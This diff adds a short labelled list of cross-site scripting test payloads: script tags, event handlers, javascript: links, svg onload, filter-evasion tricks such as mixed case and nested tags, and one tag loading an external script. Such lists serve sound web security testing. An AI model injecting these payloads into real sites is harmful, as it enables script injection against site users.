@@ -1,0 +1,10 @@
+Basic Script Tag::<script>alert("XSS")</script>
+Single Quote Variant::<script>alert('XSS')</script>
+Event Handler::<img src=x onerror=alert("XSS")>
+HTML Entity Encoding::&lt;script&gt;alert("XSS")&lt;/script&gt;
+Mixed Case Script Tag::<ScRiPt>alert("XSS")</ScRiPt>
+Using Different Attributes::<a href="javascript:alert('XSS')">Click me</a>
+Bypassing with Different Tags::<svg/onload=alert("XSS")>
+Using Non-Standard Tags::<scr<script>ipt>alert(1)</scr<script>ipt>
+Commenting Out the Script Tag::<script>alert("XSS")<!--</script>
+Check for Whitespace Handling::<script   src=//x.com></script>
